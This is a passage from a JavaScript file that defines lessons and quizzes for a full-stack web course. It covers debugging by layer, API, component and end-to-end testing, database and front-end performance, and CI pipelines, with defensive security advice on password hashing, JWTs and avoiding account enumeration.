          ], 2, 'Scoping the query by owner makes the check impossible to forget, whereas guessable ids and after-the-fact comparisons both rely on discipline.'),
          q('Where must a role used by requireRole come from?', [
            'A role field in the request body',
            'The stored user record that the verified token identifies',
            'An X-Role header set by the client',
            'A query parameter, so it can be tested easily',
          ], 1, 'Anything the client supplies can be edited by the client, so only server-held data can decide privileges.'),
          q("Why answer 404 rather than 403 when a valid token requests another user's private record?", [
            '404 responses are cheaper to generate',
            '403 is reserved for administrator routes',
            '404 keeps the request out of the access log',
            'A 403 confirms the record exists, which is itself information',
          ], 3, 'Distinguishing the two statuses lets an attacker enumerate which ids are real before attacking anything.'),
        ]),
      ],
      [
        q('Why is bcrypt preferred over SHA-256 for passwords?', [
          'It produces shorter hashes',
          'It is deliberately slow and salts automatically, making brute force impractical',
          'It is reversible with the right key',
          'It is the only algorithm Node supports',
        ], 1, 'Password hashing should be slow. Fast general-purpose hashes let attackers test billions of guesses per second.'),
        q('What is unsafe to put in a JWT payload?', [
          'The user id',
          'An expiry timestamp',
          'Anything secret — the payload is signed but readable by anyone',
          'The issuer name',
        ], 2, 'JWTs are signed, not encrypted. Anyone holding the token can decode and read the payload.'),
        q('Why return "Invalid email or password" instead of naming which was wrong?', [
          'It is shorter to display',
          'Distinct messages reveal which accounts exist, enabling enumeration',
          'It avoids translation work',
          'The server cannot tell them apart',
        ], 1, '"No such user" confirms an email is unregistered — letting an attacker map your user base before attacking passwords.'),
        q('Why must the express.static catch-all be registered after API routes?', [
          'Static files load faster that way',
          'A catch-all matches everything, so registered first it would intercept API requests',
          'Express requires alphabetical registration',
          'It only works after app.listen',
        ], 1, 'app.get("*") matches every path. Placed before your API routes it returns index.html for /api/... too.'),
      ]
    ),
    chapter(
      'Debugging and Automated Testing',
      'Proving which layer a bug lives in, and the two kinds of test that stop it coming back.',
      [
        lesson('Finding the Layer a Bug Lives In', 13, `
Every full-stack bug lives in exactly one layer, and the fastest way to fix it is to prove which layer *before* changing a line of code. A request crosses the browser, the network, your middleware stack, a route handler, and the database. Guessing means editing five places; bisecting means editing one.

### Start at the boundary

Open DevTools, go to the Network tab, trigger the action, and read the row.

| What the Network tab shows | Where the bug is |
|---|---|
| No request at all | The client — the handler never fired, or the effect never ran |
| \`404\` | Wrong path, or a router mounted at a different prefix than you think |
| \`400\` with your own validation message | The client is sending the wrong shape — read the request payload |
| \`401\` | The token was never attached, or it has expired |
| \`500\` | The server. Stop reading the browser and go read the server log |
| \`200\` with correct JSON, empty screen | React — state, keys, or render logic |

That last row is the one worth internalising. Once the response is correct, no amount of staring at Express will help you.

### Take React out of the equation

\`curl\` talks to your API with nothing in between:

\`\`\`bash
curl -i -X POST http://localhost:5000/api/register -H 'Content-Type: application/json' -d '{"name":"Ali","email":"ali@example.com"}'
\`\`\`

\`-i\` prints the status line and headers. If curl gets a \`201\` and the browser gets a \`400\`, the bug is in what your client sends — the handler is fine. If curl fails too, you have just removed the entire front end from the search space and can work in one file.

### Four failures you will hit this month

- **\`req.body\` is empty or undefined.** Either \`express.json()\` is missing or registered after the route (Chapter 4) — then it is \`undefined\` — or the caller never sent \`Content-Type: application/json\`: \`curl -d\` defaults to \`application/x-www-form-urlencoded\`, which the JSON parser ignores, leaving \`req.body\` as \`{}\`.
- **A CORS error in the console.** The request *reached* your server and came back. CORS is the browser refusing to hand the response to your JavaScript because the server did not say your origin is allowed. It is always fixed on the server, never in the client.
- **A \`404\` on a hard refresh of \`/courses\` in production.** The catch-all from Chapter 5 is missing, or it is registered before the API routes and swallowing them.
- **A \`useEffect\` that never stops firing.** A dependency is an object or array rebuilt on every render, so it is never equal to the previous one and the effect re-runs forever.

### When the layer really is React

Once the response is correct, switch tools. The React DevTools **Components** tab shows the live props and state of any node in the tree — confirm that the data you just watched arrive in the Network tab actually reached the component, in the shape you assumed it had.

\`\`\`jsx
// Logs on every render — did the component re-run at all?
console.log('CourseList render', { status, count: courses.length });

// Logs only when the effect re-runs — did a dependency change?
useEffect(() => console.log('effect ran for', courseId), [courseId]);
\`\`\`

Those two lines separate the two questions people constantly conflate. A component that renders once with an empty array is a fetch that never made it into state. A component that renders forever is the dependency problem above. A component that never renders at all is usually a parent that threw during render — and without an error boundary, one thrown error takes the entire subtree down and leaves you a blank white page with nothing in the Network tab to explain it.

### Make production bugs traceable

Logging the word "error" tells you nothing at 2am. Log one structured line per request, carrying an id you also hand back to the caller:

\`\`\`js
import { randomUUID } from 'node:crypto';

app.use((req, res, next) => {
  req.id = randomUUID();
  res.setHeader('X-Request-Id', req.id);        // the user can quote this back to you
  console.log(JSON.stringify({ id: req.id, method: req.method, path: req.path }));
  next();
});
\`\`\`

Log the same \`req.id\` inside the error handler from Chapter 4, and one \`grep\` turns "it broke this morning" into the exact failing request, with its path, body size, and stack trace.

### Read the error before you theorise

The first line of a stack trace names the file and the line number. The classic mistake is skimming past it, deciding the framework must be broken, and rewriting a component that worked — when the message said \`Cannot read properties of undefined (reading 'title')\` and the real fix was a single \`?.\` from Chapter 2.
        `,
        [
          q('curl gets 201 from the endpoint but the browser gets 400. Where is the bug?', [
            'In what the client sends — the handler itself is fine',
            'In the route handler',
            'In the database constraint',
            'In the error-handling middleware',
          ], 0, 'The same endpoint succeeded without the front end, so the difference must be the request the front end builds.'),
          q('A CORS error appears in the browser console. Where is it fixed?', [
            'In the fetch options',
            'In the React build configuration',
            'On the server, which must declare the calling origin as allowed',
            'In the browser security settings',
          ], 2, 'The request already reached the server and returned; the browser withholds the response because the server did not permit the origin.'),
          q('What does attaching a generated request id to every log line and response header buy you?', [
            'Faster responses through connection reuse',
            'A user can quote the id back and one grep finds that exact failing request',
            'Automatic retries of failed requests',
            'Protection against duplicate submissions',
          ], 1, 'It turns "it broke this morning" into a specific request with its path, body size, and stack trace.'),
        ]),
        lesson('Testing the API with Vitest and Supertest', 14, `
API tests buy more confidence per line than any other kind. One request exercises routing, middleware, validation, the handler, and the database together — and unlike a browser test, it finishes in milliseconds.

### Make the app importable

The one structural change tests need is an app built by a module that never listens:

\`\`\`js
// src/app.js — builds the app, opens nothing
export function createApp() {
  const app = express();
  app.use(express.json());
  app.use('/api', apiRouter);             // the routes from Chapters 4 and 5
  app.use(errorHandler);                  // last, as always (Chapter 4)
  return app;
}

// src/server.js — the only place a port is bound
import { createApp } from './app.js';
createApp().listen(process.env.PORT || 5000);
\`\`\`

Import a module that calls \`app.listen()\` and your test run binds a port and then hangs, because a listening server keeps the Node process alive. Supertest starts and stops its own ephemeral server for each request.

### A first test

\`\`\`js
import { describe, it, expect, beforeEach } from 'vitest';
import request from 'supertest';
import { createApp } from '../src/app.js';
import { resetDatabase } from './helpers.js';

const app = createApp();
beforeEach(() => resetDatabase());        // drop and re-migrate, or truncate every table

describe('POST /api/register', () => {
  it('rejects a missing email with 400', async () => {
    const res = await request(app).post('/api/register').send({ name: 'Ali' });

    expect(res.status).toBe(400);
    expect(res.body.message).toBe('Validation failed');
  });

  it('creates the user and returns 201', async () => {
    const res = await request(app)
      .post('/api/register')
      .send({ name: 'Ali', email: 'ali@example.com', password: 'hunter2!' });

    expect(res.status).toBe(201);
    expect(res.body.email).toBe('ali@example.com');
    expect(res.body.passwordHash).toBeUndefined();   // never serialise the hash
  });
});
\`\`\`

Each test **arranges** its own data, **acts** with one request, and **asserts** on the status and the body. Assert on the contract a caller can see, never on which internal function ran — then refactoring the handler does not break the suite.

### Isolate the data

Point tests at their own database: \`DATABASE_URL=:memory:\` for SQLite, or a dedicated test database you recreate on every run. Then reset between tests.

The classic mistake is a suite where every test passes alone and half of them fail together. That is almost always shared rows: one test registers \`ali@example.com\`, the next registers it again and gets a \`409\` from the \`UNIQUE\` constraint of Chapter 5. Assume tests run in any order, or in parallel, because eventually they will.

### Testing a guarded route

\`\`\`js
it('rejects an unauthenticated request', async () => {
  const res = await request(app).get('/api/my-courses');
  expect(res.status).toBe(401);
});

it("refuses another user's enrolment", async () => {
  const login = await request(app)
    .post('/api/login')
    .send({ email: 'ali@example.com', password: 'hunter2!' });

  const res = await request(app)
    .get('/api/enrolments/99')                       // belongs to someone else
    .set('Authorization', \`Bearer \${login.body.token}\`);

  expect(res.status).toBe(403);
});
\`\`\`

### Pin the security behaviour too

\`\`\`js
it('does not leak internals when the handler throws', async () => {
  vi.spyOn(repo, 'listCourses').mockRejectedValue(new Error('connection refused at 10.0.0.4'));

  const res = await request(app).get('/api/courses');

  expect(res.status).toBe(500);
  expect(res.body.message).toBe('Internal server error');        // generic, as Chapter 4 insisted
  expect(JSON.stringify(res.body)).not.toContain('10.0.0.4');    // no host, no stack, no paths
});
\`\`\`

Somebody will eventually "improve" that error handler by returning \`err.message\` to make debugging easier. This test is what stops the improvement reaching production.

### Wire it into npm scripts

\`\`\`json
{
  "scripts": {
    "test": "vitest run",
    "test:watch": "vitest",
    "test:coverage": "vitest run --coverage"
  }
}
\`\`\`

\`vitest run\` executes once and exits, which is what CI needs; the bare \`vitest\` watches files and re-runs as you type, which is what you want while writing. Point the suite at throwaway configuration rather than your development environment:

\`\`\`js
// vitest.config.js
export default {
  test: {
    environment: 'node',
    setupFiles: ['./tests/setup.js'],   // loads .env.test, then migrates a clean schema
  },
};
\`\`\`

Running the suite against your development database is a mistake you make exactly once. \`resetDatabase()\` truncates every table, so the first accidental run deletes the accounts and enrolments you have been clicking through all week.

### Test the unhappy paths first

Happy paths break loudly the first time anyone clicks through the app. The paths that break *silently* are the ones worth automating: \`400\` on invalid input, \`401\` with no token, \`409\` on a duplicate email, and above all \`403\` when the token is valid but the record belongs to somebody else. That authorisation test is the most valuable one in most codebases, precisely because normal use never exercises it — which is exactly why the bug ships.

Chase route coverage rather than line coverage: every endpoint deserves one happy case and its refusals.
        `,
        [
          q('What should an API test assert on?', [
            'Which internal service function the handler called',
            'The number of SQL queries executed',
            'The shape of the module exports',
            'The status code and response body a caller can observe',
          ], 3, 'Asserting on the visible contract lets you refactor the handler freely without rewriting the suite.'),
          q('Why does CI run vitest run rather than plain vitest?', [
            'vitest run executes the suite once and exits, instead of watching for changes',
            'Plain vitest skips setup files',
            'vitest run enables coverage automatically',
            'Plain vitest cannot import ES modules',
          ], 0, 'A watcher never exits, so a CI job invoking bare vitest would hang until it timed out.'),
          q('Which test earns its place most, because normal use never exercises it?', [
            '200 on the happy path',
            '201 after a valid registration',
            '403 when the token is valid but the record belongs to someone else',
            '404 for a path that does not exist',
          ], 2, 'Nobody clicks their way into another user record by accident, so only an automated test catches a missing ownership check.'),
        ]),
        lesson('Testing React Components the Way Users Use Them', 13, `
The guiding rule of React Testing Library is that a test should drive a component the way a person does: find things by their visible text or accessible role, interact, and assert on what appears. Never on state variables, hook calls, or class names.

\`\`\`jsx
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { vi } from 'vitest';
import SignupForm from './SignupForm';

test('submits the email that was typed', async () => {
  const onSubmit = vi.fn();
  render(<SignupForm onSubmit={onSubmit} />);

  await userEvent.type(screen.getByLabelText(/email/i), 'ali@example.com');
  await userEvent.click(screen.getByRole('button', { name: /sign up/i }));

  expect(onSubmit).toHaveBeenCalledWith({ email: 'ali@example.com' });
});
\`\`\`

That test knows nothing about \`useState\`. Rewrite the controlled input from Chapter 3 as a reducer, swap in a form library, add three fields — it still passes. That is what a test is for.

### Query in priority order

\`getByRole\` first, \`getByLabelText\` for form fields, then \`getByText\`. \`getByTestId\` is the last resort.

There is a hidden benefit here. When \`getByRole('button')\` cannot find your button, it is usually because the button is a clickable \`<div>\` — the Chapter 1 mistake — and the failing test has just found you a real accessibility bug.

### get, query, find

| Query | If nothing matches | Use it for |
|---|---|---|
| \`getBy…\` | throws immediately | it must be on screen right now |
| \`queryBy…\` | returns \`null\` | asserting something is **not** there |
| \`findBy…\` | returns a promise, retries ~1s | it appears after async work |

The classic mistake:

\`\`\`jsx
expect(screen.getByText(/loading/i)).toBeNull();     // getBy throws first — the assertion never runs
expect(screen.queryByText(/loading/i)).toBeNull();   // correct way to assert absence
expect(await screen.findByText('React Basics')).toBeInTheDocument();  // waits for the fetch
\`\`\`

### Fake the network, not your component

\`CourseList\` from Chapter 3 fetches on mount. Do not hand-stub \`global.fetch\` in every test — intercept at the network layer with MSW so the component runs its real code path:

\`\`\`js
// setupTests.js
import { http, HttpResponse } from 'msw';
import { setupServer } from 'msw/node';

export const server = setupServer(
  http.get('/api/learn/courses', () =>
    HttpResponse.json({ data: [{ id: 1, title: 'React Basics' }] })
  )
);

beforeAll(() => server.listen());
afterEach(() => server.resetHandlers());   // undo any per-test override
afterAll(() => server.close());
\`\`\`

Now you can test all three states from Chapter 3 — including the one nobody writes:

\`\`\`jsx
test('shows a message when the API fails', async () => {
  server.use(http.get('/api/learn/courses', () => new HttpResponse(null, { status: 500 })));

  render(<CourseList />);
  expect(await screen.findByText(/could not load/i)).toBeInTheDocument();
});
\`\`\`

### Render with the providers the component needs

A page that calls \`useNavigate\` or reads an auth context throws the instant you render it bare — *useNavigate() may be used only in the context of a Router*. Wrap it once in a helper instead of repeating the setup in every test:

\`\`\`jsx
function renderWithProviders(ui, { route = '/' } = {}) {
  return render(
    <AuthProvider>
      <MemoryRouter initialEntries={[route]}>{ui}</MemoryRouter>
    </AuthProvider>
  );
}

test('shows the outline for a course', async () => {
  renderWithProviders(<CourseOutline />, { route: '/courses/full-stack-web' });
  expect(await screen.findByRole('heading', { name: /full-stack/i })).toBeInTheDocument();
});
\`\`\`

The helper is also the right place to seed a logged-in user, so a test for a guarded page costs one line rather than five lines of scaffolding.

### About that act() warning

\`An update to CourseList was not wrapped in act(...)\` means state changed after the test had finished — usually an \`await\` you forgot on a \`userEvent\` call, or a fetch resolving into an unmounted component. The fix is almost never to reach for \`act()\`; it is to \`await\` a \`findBy…\` so the test waits for the update it triggered. It is the same class of problem the cleanup function in Chapter 3 solves in real code.

### When a query finds nothing

\`\`\`jsx
screen.debug();                          // prints the rendered DOM as it currently stands
screen.getByRole('nonexistent-role');    // the error lists every role actually on screen
\`\`\`

A failing \`getByRole\` prints the accessible tree with the roles and names it *did* find, which usually answers the question on the spot: the accessible name is split across two elements, the label is not wired to the input (Chapter 1), or the element is still behind a loading state you forgot to await.

### What not to test

Do not assert that a hook ran, that a spinner has a particular class, or that a child received a specific prop. Those tests fail on every harmless refactor and keep passing while the app is visibly broken.
        `,
        [
          q('Which query should you reach for first?', [
            'getByTestId',
            'getByRole',
            'container.querySelector',
            'getByClassName',
          ], 1, 'Role queries match how assistive technology and users perceive the element, so they survive refactors.'),
          q('getByRole("button", { name: /enrol/i }) cannot find your Enrol control. What has it usually revealed?', [
            'The test forgot to await the render',
            'React Testing Library does not support regular expressions',
            'The control is a clickable div rather than a button, which is a real accessibility bug',
            'The component must be wrapped in act()',
          ], 2, 'A missing role usually means the markup is not the element it pretends to be, so the failing test found a genuine defect.'),
          q('You get "An update to CourseList was not wrapped in act(...)". What is the usual fix?', [
            'Await a findBy query so the test waits for the update it triggered',
            'Wrap the render call in act()',
            'Mock the component state',
            'Disable strict mode in the test setup',
          ], 0, 'The warning means state settled after the test finished, so the test needs to await the change rather than silence the warning.'),
        ]),
        lesson('End-to-End Tests with Playwright', 13, `
API tests prove the server is right and component tests prove a screen is right. Neither proves that a learner can register, enrol, and land on chapter one — because that journey crosses the browser, the router, the API, and the database, and the seams between them are where integrations actually break.

### One test, the whole stack

\`\`\`js
// tests/e2e/enrol.spec.js
import { test, expect } from '@playwright/test';

test('a learner can register and enrol', async ({ page }) => {
  const email = \`learner-\${Date.now()}@example.com\`;

  await page.goto('/register');
  await page.getByLabel('Email address').fill(email);
  await page.getByLabel('Password').fill('hunter2!');
  await page.getByRole('button', { name: 'Create account' }).click();

  await page.getByRole('link', { name: 'Full-Stack Web Development' }).click();
  await page.getByRole('button', { name: 'Enrol' }).click();

  await expect(page.getByRole('heading', { name: 'How the Web Works' })).toBeVisible();
});
\`\`\`

The queries are the ones from the previous lesson, chosen for the same reason: a role and an accessible name survive a redesign that a CSS selector does not.

### Never sleep

\`\`\`js
await page.waitForTimeout(2000);                        // slow when it passes, flaky when it fails
await expect(page.getByText('Enrolled')).toBeVisible(); // retries until it appears or times out
\`\`\`

Playwright actions and assertions wait automatically: \`click\` waits for the element to exist, be visible, and stop moving before it clicks. A fixed sleep is a guess about somebody else's machine, and CI is always slower than your laptop. A suite with sleeps in it is a suite with flakes in it.

### Give the run a real application

\`\`\`js
// playwright.config.js
export default {
  use: { baseURL: 'http://localhost:5000', trace: 'on-first-retry' },
  webServer: {
    command: 'npm run start:test',   // builds the client, boots the API on a test database
    url: 'http://localhost:5000/health',
    reuseExistingServer: !process.env.CI,
  },
};
\`\`\`

Point it at a throwaway database exactly as the API suite does. \`trace: 'on-first-retry'\` is the setting that repays itself fastest: \`npx playwright show-report\` replays the failed run with a DOM snapshot, the network log, and a screenshot at every step, which is how you debug a failure that only ever happens in CI.

### Data must be unique, or reset

That \`Date.now()\` in the email is deliberate. End-to-end tests hit a real database with real constraints, so a hard-coded address passes once and then fails on the \`UNIQUE\` constraint from Chapter 5 for the rest of time. Either generate fresh data per run or reset the database between runs — never inherit the state the last run left behind.

### Log in once, not fifty times

\`\`\`js
// global-setup.js — sign in once, then save cookies and storage
await page.context().storageState({ path: 'tests/.auth/user.json' });

// playwright.config.js
use: { storageState: 'tests/.auth/user.json' }
\`\`\`

Every other test then starts already signed in. Driving the login form in all fifty specs adds minutes to the run and gives you fifty tests that fail when the login page changes, instead of the single one that should.

### Keep the pyramid the right way up

End-to-end tests are slow, need real infrastructure, and fail for reasons that are not bugs. Write many API tests, a decent number of component tests, and a handful of end-to-end tests covering the journeys the business cannot afford to lose: sign up, sign in, pay, enrol, complete. If you are checking every validation message through a browser, move those cases down to the layers that run in milliseconds.
        `,
        [
          q('Why is await page.waitForTimeout(2000) a bad way to wait for content?', [
            'Playwright removed the method in recent versions',
            'Assertions already retry until the timeout, so a fixed sleep is slow when it passes and still flaky when the machine is slower',
            'It only works in headed mode',
            'It resets the browser context',
          ], 1, 'Auto-waiting adapts to the machine; a hard-coded sleep guesses, and CI eventually guesses wrong.'),
          q('Why does the test build the email address from Date.now()?', [
            'End-to-end tests write to a real database, so a fixed address collides with the UNIQUE constraint on the second run',
            'Playwright rejects duplicate form values',
            'It makes the trace easier to read',
            'The API rejects addresses without a number in them',
          ], 0, 'Unlike a mocked API test, this one leaves real rows behind, so the data it creates has to be unique or cleaned up.'),
          q('What does storageState give a suite?', [
            'A record of every network request for debugging',
            'Automatic rollback of database changes between tests',
            'A saved signed-in session, so tests start logged in instead of driving the login form',
            'Parallel execution across browsers',
          ], 2, 'It persists cookies and local storage from one login so the rest of the suite skips that flow entirely.'),
        ]),
      ],
      [
        q('The Network tab shows a 200 with exactly the JSON you expected, but the list renders empty. Where is the bug?', [
          'The Express route handler',
          'The database query',
          'The React state or render logic',
          'The CORS configuration',
        ], 2, 'A correct response means every server layer already did its job; what is left is how the component stores and renders it.'),
        q('Why should the module your tests import build the app without calling app.listen()?', [
          'Supertest can only test routers, not applications',
          'A listening server keeps an open handle, so the test process hangs instead of exiting',
          'Middleware is not registered until listen() runs',
          'Vitest cannot import modules that use Express',
        ], 1, 'Supertest binds its own ephemeral port; an app that listens on import leaves Node alive after the suite finishes.'),
        q('Which query correctly asserts that a loading message is no longer on screen?', [
          'getByText(/loading/i)',
          'findByText(/loading/i)',
          'getAllByText(/loading/i)',
          'queryByText(/loading/i)',
        ], 3, 'Only queryBy returns null when nothing matches — getBy throws before your assertion ever runs.'),
        q('Your API tests pass individually but several fail when the whole suite runs. Most likely cause?', [
          'They share database rows, so each one depends on what ran before it',
          'Supertest cannot open more than one connection',
          'Vitest caches HTTP responses between files',
          'The error handler is registered twice',
        ], 0, 'Unreset shared data makes tests order-dependent; each test must create the rows it needs against a clean database.'),
      ]
    ),
    chapter(
      'Performance, Scale, and Operations',
      'Making the stack fast once there is real data in it, and running it safely after launch.',
      [
        lesson('Making the Database Do Less Work', 14, `
An API that feels instant with 20 rows and takes four seconds with 20,000 is almost never slow in JavaScript. It is doing one of three things in the database: running a query per row, scanning a table with no usable index, or returning data nobody asked for.

### The N+1 query

\`\`\`js
// One query for the list…
const courses = await db.all('SELECT id, title FROM courses');

// …and one more for every single row. 50 courses = 51 round trips.
for (const c of courses) {
  c.chapters = await db.all('SELECT id, title FROM chapters WHERE courseId = ?', c.id);
}
\`\`\`

Locally each round trip costs a fraction of a millisecond, so this looks perfectly healthy. In production the database sits on another machine and each trip costs 5–20ms: 51 of them add up to between a quarter of a second and a full second of pure waiting. This is the most common performance bug in web applications, and ORMs with lazy relations produce it invisibly.

Fix it with one batched query instead of N:

\`\`\`js
const ids = courses.map(c => c.id);
const holes = ids.map(() => '?').join(',');       // still parameterised (Chapter 5)

const rows = await db.all(
  \`SELECT courseId, id, title FROM chapters WHERE courseId IN (\${holes}) ORDER BY position\`,
  ids
);

const byCourse = new Map(courses.map(c => [c.id, []]));
for (const row of rows) byCourse.get(row.courseId).push(row);
for (const c of courses) c.chapters = byCourse.get(c.id);
\`\`\`

Two queries whether the list holds 5 rows or 5,000. Turn query logging on in development and count the lines: if the number of queries grows with the size of the response, you have an N+1.

### Read the plan instead of guessing

\`\`\`sql
EXPLAIN QUERY PLAN SELECT * FROM lesson_progress WHERE userId = 7;
-- SCAN lesson_progress                                    <- reads every row
-- SEARCH lesson_progress USING INDEX idx_progress_user    <- what you want to see
\`\`\`

In PostgreSQL the command is \`EXPLAIN ANALYZE\` and you are looking for \`Index Scan\` rather than \`Seq Scan\`. Either way, measure the plan — do not reason about it from the outside.

### Composite indexes read left to right

The index from Chapter 5 covers \`(userId, lessonId)\`. It serves:

| Query | Uses the index? |
|---|---|
| \`WHERE userId = ?\` | Yes |
| \`WHERE userId = ? AND lessonId = ?\` | Yes |
| \`WHERE lessonId = ?\` | **No** |

Only a leftmost prefix counts. The classic mistake is adding an index, seeing no improvement at all, and concluding indexes do not help — when the query filters on the second column alone and needs its own index.

### Aggregate where the data already is

Pulling ten thousand rows into Node so JavaScript can count them wastes the network and the memory both:

\`\`\`js
// Slow: every row crosses the wire so that .filter() can discard most of them
const rows = await db.all('SELECT * FROM lesson_progress WHERE courseId = ?', id);
const done = rows.filter(r => r.completedAt).length;

// Fast: one number crosses the wire
const { done } = await db.get(
  'SELECT COUNT(*) AS done FROM lesson_progress WHERE courseId = ? AND completedAt IS NOT NULL',
  id
);
\`\`\`

The same applies to \`GROUP BY\`, \`SUM\`, and \`ORDER BY\`. The database has the indexes and decades of query optimisation behind it; your handler has one thread it must not block (Chapter 4). Do the reducing next to the data.

### Return less

\`\`\`js
const limit = Math.min(Math.max(Number(req.query.limit) || 20, 1), 100);   // clamp at both ends
const rows = await db.all('SELECT id, title FROM courses ORDER BY id LIMIT ?', limit);
\`\`\`

Clamp the bottom as well as the top: a bare \`Math.min\` still lets \`?limit=-1\` through, and SQLite reads \`LIMIT -1\` as *no limit at all* — the caller gets the whole table, which is exactly what you were trying to prevent.

Select the columns the screen actually needs. A list view that drags a long \`body\` column along wastes bandwidth, memory, and serialisation time on every request.

Deep \`OFFSET\` degrades too, because the database still walks the rows it skips. For long lists, page by the last id you saw:

\`\`\`sql
SELECT id, title FROM courses WHERE id > ? ORDER BY id LIMIT 20;   -- constant cost at any depth
\`\`\`

### Let the client skip the request entirely

\`\`\`js
res.set('Cache-Control', 'public, max-age=300');   // a catalogue that changes hourly
\`\`\`

Express already sends an \`ETag\`, so a matching \`If-None-Match\` returns \`304 Not Modified\` with no body at all. The fastest query is the one you never run.
        `,
        [
          q('A limit is clamped with Math.min(Number(req.query.limit) || 20, 100) and a caller sends ?limit=-1. What happens in SQLite?', [
            'No rows come back',
            'The driver throws a type error',
            'The clamp holds, because Math.min already caps the value',
            'LIMIT -1 means no limit, so the whole table is returned',
          ], 3, 'Only clamping the top leaves negatives through, and a negative LIMIT disables the limit entirely.'),
          q('You need the number of completed lessons in a course. Which approach is right?', [
            'SELECT every row and count the completed ones in JavaScript',
            'SELECT COUNT(*) with the condition in the WHERE clause',
            'SELECT every row and use reduce for the total',
            'Fetch rows in pages and add the page counts',
          ], 1, 'One number crosses the network instead of thousands of rows the handler would only throw away.'),
          q('Why does OFFSET-based pagination get slower the deeper you page?', [
            'The index is rebuilt for each page',
            'Each page opens a new connection',
            'The database still walks every row it skips before returning any',
            'OFFSET disables the query planner',
          ], 2, 'Skipping is work, so paging by the last id you saw keeps the cost constant at any depth.'),
        ]),
        lesson('Front-End Performance Users Can Feel', 14, `
Users do not experience your bundle size. They experience three things: **LCP** — when the main content appears, aim under 2.5s; **CLS** — how much the layout jumps around, under 0.1; and **INP** — how long a tap takes to show a result, under 200ms.

### Measure before you change anything

\`\`\`bash
npm run build
npx source-map-explorer 'build/static/js/*.js'   # what is actually in the bundle
\`\`\`

Run Lighthouse on a throttled profile too. The classic mistake is scattering \`useMemo\` through a codebase that is slow because it ships a 900KB date library and four unoptimised photographs. Profile first, then fix the tallest bar.

### Ship less JavaScript

Split at route boundaries before anything else:

\`\`\`jsx
import { lazy, Suspense } from 'react';

const CourseOutline = lazy(() => import('./pages/CourseOutline'));
const Certificate   = lazy(() => import('./pages/CertificateView'));

<Suspense fallback={<Spinner />}>
  <Routes>
    <Route path="/courses/:slug" element={<CourseOutline />} />
    <Route path="/certificate/:id" element={<Certificate />} />
  </Routes>
</Suspense>
\`\`\`

A PDF renderer used on one page should not sit in the file every visitor downloads before they see the home page.

### Kill the waterfall

\`\`\`jsx
// Sequential: the second request cannot start until the first resolves
const profile = await fetchProfile();
const catalogue = await fetchCatalogue();

// Independent work, started together (Chapter 2)
const [profile, catalogue] = await Promise.all([fetchProfile(), fetchCatalogue()]);
\`\`\`

A parent that fetches, renders a child, and lets the child fetch produces the same staircase in component form — each level waiting on the one above. Fetch at the top and pass the data down as props.

### Memoise deliberately

\`\`\`jsx
// memo() does nothing here — a new object and a new function on every render
<CourseList filters={{ level: 'beginner' }} onPick={(id) => open(id)} />

// Stable identities, so the comparison can actually succeed
const filters = useMemo(() => ({ level }), [level]);
const onPick  = useCallback((id) => open(id), [open]);
export default memo(CourseCard);
\`\`\`

\`memo\` compares props by reference — the same rule from Chapter 2 that governs React state. An inline object or arrow function defeats it completely, which is why "I wrapped it in memo and nothing changed" is such a common report. Memoise a component when it is genuinely expensive **and** its props are stable; otherwise you have added work rather than removed it.

### The cheap wins are not JavaScript

- Give every image explicit \`width\` and \`height\`. The browser reserves the space before the file arrives and your CLS drops to zero. Layout shift is nearly always an image, a banner, or a late-loading font.
- \`loading="lazy"\` on anything below the fold, and serve sensible dimensions. A 4000px hero scaled to 600px in CSS still downloads all four thousand pixels.
- \`font-display: swap\` so text is readable while the webfont loads.
- Never render 5,000 rows. Paginate against the API from the previous lesson, or virtualise so only the visible window exists in the DOM.

### Cache and de-duplicate requests

Two components that both need the course list will both fetch it — the effect from Chapter 3 has no memory of what another component already asked for. A data layer such as TanStack Query gives you one request, a shared cache, and background revalidation:

\`\`\`jsx
const { data, isLoading, error } = useQuery({
  queryKey: ['courses'],
  queryFn: () => fetch('/api/learn/courses').then(r => r.json()),
  staleTime: 60_000,          // treat the cached copy as fresh for a minute
});
\`\`\`

Those are the same three states from Chapter 3 without the boilerplate, and returning to a page you have already visited paints instantly from cache while the refetch happens quietly behind it. If you would rather not add the dependency, the principle survives on its own: hoist the fetch to a shared parent or a context so each piece of data is requested once, not once per component that happens to display it.

### Close the loop

Change one thing, rebuild, measure again — with the Network panel throttled to Fast 3G and the CPU slowed 4×. Your laptop on office fibre is the least representative device your application will ever run on, and an optimisation that helps there can easily make a mid-range phone worse.
        `,
        [
          q('Which metric does adding explicit width and height to every image improve most?', [
            'CLS, because the browser reserves the space before the file arrives',
            'LCP, because the image downloads sooner',
            'INP, because taps are handled faster',
            'None — the attributes are purely cosmetic',
          ], 0, 'Reserved space means nothing below the image jumps when it loads, which is exactly what CLS measures.'),
          q('What should you do before scattering useMemo through a slow app?', [
            'Wrap every component in memo first',
            'Move all state into context',
            'Measure the bundle and run Lighthouse on a throttled profile',
            'Upgrade to the latest React version',
          ], 2, 'Optimising without measuring usually decorates the fast parts while a huge dependency or an unoptimised image goes untouched.'),
          q('What does staleTime: 60_000 mean in the useQuery example?', [
            'The request is retried for 60 seconds before failing',
            'The cached copy counts as fresh for a minute, so a revisit paints from cache',
            'The cache entry is deleted after a minute',
            'The query waits a minute before running',
          ], 1, 'Within the stale window there is no refetch at all, which is what makes returning to a page feel instant.'),
        ]),
        lesson('Pipelines, Migrations, and Incidents', 13, `
After launch the question stops being "does it work?" and becomes "can I change it on a Friday afternoon and still sleep?" Three things buy that: a pipeline that refuses bad code, migrations that can be rolled back, and enough visibility to know something broke before a user tells you.

### Run the checks on every pull request

\`\`\`yaml
# .github/workflows/ci.yml
name: CI
on: [pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
      - run: npm ci           # installs the exact locked tree (Chapter 4)
      - run: npm run lint
      - run: npm test         # the Supertest and RTL suites from Chapter 6
      - run: npm run build    # a build that fails here must never reach production
\`\`\`

Use \`npm ci\`, not \`npm install\`. It installs exactly what \`package-lock.json\` pins and fails loudly when the lock file is stale, so CI can never pass against a different dependency tree than the one you tested.

### Migrations are committed code

Every schema change is a numbered file in the repository, applied in order, and never edited once it has run anywhere:

\`\`\`sql
-- migrations/007_add_last_seen.sql
ALTER TABLE users ADD COLUMN lastSeenAt TEXT;
\`\`\`

One rule makes a deploy reversible: **the previous version of your code must still work against the new schema.** During any rollout both versions are live for a while, and a rollback puts the old code back while the migration stays applied.

